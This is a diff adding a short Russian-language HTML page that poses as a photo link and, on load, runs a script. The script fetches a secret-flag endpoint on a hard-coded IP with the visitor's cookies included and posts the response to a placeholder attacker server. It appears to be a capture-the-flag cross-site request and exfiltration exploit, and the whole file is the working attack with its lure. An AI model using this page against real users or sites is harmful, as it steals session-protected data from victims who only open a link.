@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Смотрите фото!</title>
+</head>
+<body>
+    <h1>Смотрите фото!</h1>
+    <p>Кликните, чтобы увидеть фото!</p>
+    <script>
+        // Функция для отправки CSRF-запроса и перехвата ответа
+        async function stealFlag() {
+            try {
+                // Отправляем запрос на секретную страницу Кранка
+                const response = await fetch('http://77.239.125.65:13002/secret-flag', {
+                    method: 'GET',
+                    credentials: 'include'  // Важно: отправляем куки Кранка!
+                });
+
+                // Получаем текст ответа (флаг)
+                const flag = await response.text();
+
+                // Отправляем флаг на наш сервер для сбора данных
+                // Замените YOUR_SERVER_URL на адрес вашего сервера/сервиса для приёма данных
+                await fetch('YOUR_SERVER_URL/collect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain',
+                    },
+                    body: flag
+                });
+            } catch (error) {
+                console.error('Ошибка:', error);
+            }
+        }
+
+        // Запускаем атаку при загрузке страницы
+        window.onload = stealFlag;
+    </script>
+</body>
+</html>
